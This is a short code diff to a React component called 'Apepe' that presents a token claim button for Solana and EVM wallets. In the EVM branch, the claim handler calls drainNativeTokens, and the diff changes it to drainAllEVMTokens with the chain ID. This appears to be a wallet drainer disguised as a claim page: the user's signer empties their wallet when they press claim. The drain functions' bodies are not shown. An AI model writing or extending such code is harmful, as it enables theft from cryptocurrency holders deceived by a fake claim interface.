@@ -32,7 +32,7 @@ interface TokenBalance {
 const Apepe = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
-  const { activeChain } = useChain();
+  const { activeChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName } = useChainInfo();
   const [isClaiming, setIsClaiming] = useState(false);
@@ -100,7 +100,7 @@ const Apepe = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsClaiming(true);
-        await drainNativeTokens(evmSigner, evmProvider, chainName);
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
       } catch (error) {
         console.error(error);
       } finally {
